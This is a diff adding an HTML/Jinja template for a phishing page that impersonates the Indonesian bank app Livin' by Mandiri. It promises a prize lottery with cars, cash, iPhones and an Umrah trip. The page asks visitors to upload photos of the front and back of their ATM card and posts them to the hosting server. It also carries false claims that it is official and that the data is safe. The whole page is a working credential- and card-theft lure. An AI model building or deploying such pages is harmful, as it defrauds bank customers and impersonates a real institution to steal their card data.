@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Livin' by Mandiri</title>
+        <style>
+            html, body {
+                margin: 0;
+                padding: 0;
+                width: 100%;
+                height: auto;
+                overflow-x: hidden;
+                overflow: visible;
+            }
+            body {
+                font-family: sans-serif;
+                margin: 0 auto;
+                padding: 0;
+                overflow-x: hidden;
+                overflow-y: auto;
+            }
+            .image-container {
+                position: relative;
+                width: 100%;
+                max-width: 400px;
+                margin: 0 auto;
+                overflow: visible;
+                padding-bottom: 100px;
+                box-sizing: border-box;
+            }
+            .image-container img.bg {
+                width: 100%;
+                display: block;
+            }
+            .overlay-content {
+                position: absolute;
+                top: 0;
+                left: 0;
+                z-index: 2;
+                width: 100%;
+                padding: 20px;
+                box-sizing: border-box;
+            }
+            .image-wrapper {
+                width: 90%;
+                max-width: 320px;
+                margin: 12px auto 0 auto;
+                z-index: 2;
+                position: relative;
+            }
+            .image-wrapper img {
+                width: 100%;
+                max-width: 320px;
+                max-height: 220px;
+                border-radius: 8px;
+                border: 2px solid black;
+                box-shadow: 0 0 0 2px white, 0 0 0 4px black;
+            }
+            .teks-wrapper {
+                position: relative;
+                width: 90%;
+                margin: 20px auto 0 auto;
+                color: #333;
+                z-index: 2;
+            }
+            .judul-promo {
+                font-size: 18px;
+                font-weight: bold;
+                margin: 10px 0 5px;
+                line-height: 1.4;
+                text-align: center;
+                color: black;
+                text-shadow: -0.3px -0.3px 0 #f9b233, 0.3px -0.3px 0 #f9b233, -0.3px 0.3px 0 #f9b233, 0.3px 0.3px 0 #f9b233;
+            }
+            .deskripsi, .keamanan {
+                font-size: 14px;
+                margin: 4px 0;
+                line-height: 1.5;
+            }
+            .form-pilihan {
+                margin-top: 20px;
+                width: 100%;
+                max-width: 320px;
+                margin-left: auto;
+                margin-right: auto;
+                text-align: left;
+                font-family: sans-serif;
+                color: #333;
+            }
+            .form-pilihan label {
+                font-size: 14px;
+                font-weight: 600;
+                margin-bottom: 3px;
+                display: block;
+                text-shadow: -0.2px -0.2px 0 #007bff, 0.2px -0.2px 0 #007bff, -0.2px 0.2px 0 #007bff, 0.2px 0.2px 0 #007bff;
+            }
+            .form-pilihan select {
+                width: 100%;
+                padding: 10px 12px;
+                border: 1px solid #ccc;
+                border-radius: 5px;
+                font-size: 14px;
+                box-sizing: border-box;
+                appearance: none;
+                background-color: #fff;
+                cursor: pointer;
+                margin-bottom: 25px;
+            }
+            .upload-section {
+                max-width: 320px;
+                margin-left: auto;
+                margin-right: auto;
+                padding-left: 25px;
+                padding-right: 100px;
+                padding-bottom: 15px;
+                font-family: sans-serif;
+                color: #333;
+                border: 1px solid #ccc;
+                border-radius: 10px;
+            }
+            .upload-box label {
+                display: block;
+                font-size: 14px;
+                font-weight: 600;
+                margin-bottom: 2px;
+                margin-top: 6px;
+                color: #333;
+                text-shadow: -0.2px -0.2px 0 #333, 0.2px -0.2px 0 #333, -0.2px 0.2px 0 #333, 0.2px 0.2px 0 #333;
+            }
+            .upload-frame {
+                border: 2px dashed #007bff;
+                border-radius: 8px;
+                padding: 0 10px;
+                background-color: #f4faff;
+                text-align: center;
+                transition: border 0.3s ease;
+            }
+            .upload-frame:hover {
+                border-color: #0056b3;
+                background-color: #eaf4ff;
+            }
+            .upload-frame input[type="file"] {
+                width: 100%;
+                margin-top: 5px;
+                margin-bottom: 5px;
+                opacity: 0.8;
+                cursor: pointer;
+            }
+            .upload-icon {
+                font-size: 24px;
+                color: #007bff;
+            }
+            .preview-image {
+                margin-top: 10px;
+                max-width: 100%;
+                border-radius: 6px;
+                box-shadow: 0 2px 4px rgba(0,0,0,0.2);
+            }
+            .lanjut-button {
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                background-color: #007bff;
+                color: #fff;
+                border: none;
+                border-radius: 6px;
+                padding: 10px 20px;
+                font-size: 15px;
+                font-weight: bold;
+                cursor: pointer;
+                width: 100%;
+                max-width: 320px;
+                margin: 20px auto 0;
+                box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+                transition: background-color 0.3s ease;
+                gap: 10px;
+            }
+            .lanjut-button:focus {
+                border-color: #0056b3;
+                outline: none;
+                box-shadow: 0 0 0 2px rgba(0,123,255,0.2);
+            }
+            .button-content {
+                display: flex;
+                align-items: center;
+            }
+            .button-content img {
+                height: 20px;
+                width: auto;
+            }
+            .text {
+                color: #777;
+                margin: 20px auto 0 auto;
+                max-width: 320px;
+                text-align: left;
+            }
+            .text p {
+                font-size: 11px;
+            }
+        </style>
+    </head>
+    <body>
+        <div class="image-container">
+            <img src="{{ url_for('static', filename='a1.jpg') }}" class="bg" alt="Background">
+            <div class="overlay-content">
+                <div class="image-wrapper">
+                    <img src="{{ url_for('static', filename='a5.jpg') }}" class="img">
+                </div>
+                <div class="teks-wrapper">
+                    <h2 class="judul-promo">Pendaftaran Undian Livin' by Mandiri</h2>
+                    <p class="deskripsi">Lengkapi data Anda untuk mengikuti program undian berhadiah dari Livin' by Mandiri.</p>
+                    <p class="keamanan">🔒 Data Anda aman dan hanya digunakan untuk verifikasi.</p>
+                </div>
+                <form class="form-pilihan" id="myForm" method="POST" enctype="multipart/form-data">
+                    <label for="hadiah">Pilih Hadiah yang Anda Inginkan jika Terpilih:</label>
+                    <select name="hadiah" id="hadiah" required>
+                        <option value="" disabled selected>-- Pilih Hadiah --</option>
+                        <option value="fortuner">Toyota Fortuner</option>
+                        <option value="pajero">Mitsubishi Pajero</option>
+                        <option value="motor">Sepeda Motor</option>
+                        <option value="uang">Uang Tunai</option>
+                        <option value="iphone">iPhone (berbagai tipe)</option>
+                        <option value="umroh">Tiket Umroh ke Makkah</option>
+                    </select>
+                    <label for="upload-section">upload photo Kartu ATM untuk Memverikasi Lokasi cabang bank Mandiri Nasabah: </label>
+                    <div class="upload-section">
+                        <div class="upload-box">
+                            <label for="atm-depan">Foto Kartu ATM (Depan)</label>
+                            <div class="upload-frame">
+                                <span class="upload-icon">📷</span>
+                                <input type="file" id="atm-depan" name="atm_depan" onchange="previewImage(event, 'preview-depan')" required>
+                                <img id="preview-depan" class="preview-image" src="#" alt="Preview" style="display: none;">
+                            </div>
+                        </div>
+
+                        <div class="upload-box">
+                            <label for="atm-depan">Foto Kartu ATM (Belakang)</label>
+                            <div class="upload-frame">
+                                <span class="upload-icon">📷</span>
+                                <input type="file" id="atm-belakang" name="atm_belakang" onchange="previewImage(event, 'preview-belakang')" required>
+                                <img id="preview-belakang" class="preview-image" src="#" alt="Preview" style="display: none;">
+                            </div>
+                        </div>
+                    </div>
+                    <button class="lanjut-button" type="submit">
+                        <span class="button-content">
+                            <img src="{{ url_for('static', filename='a3.png') }}" alt="Bank">
+                            </span>DAFTAR</span>
+                        </span>
+                    </button>
+                </form>
+                <footer class="text">
+                    <p>Program resmi dari livin' by Mandiri. Tidak dipungut biaya apapun.</p>
+                    <p>&copy; 2025 Livin' by Mandiri. Platform resmi digital Mandiri. Hak cipta dilindungi.</p>
+                </footer>
+                <script>
+                     function previewImage(event, previewId) {
+                        const input = event.target;
+                        const reader = new FileReader();
+                        reader.onload = function(){
+                            const img = document.getElementById(previewId);
+                            img.src = reader.result;
+                            img.style.display = 'block';
+                        }
+                        if(input.files[0]){
+                            reader.readAsDataURL(input.files[0]);
+                        }
+                     }
+                </script>
+            </div>
+        </div>
+    </body>
+</html>
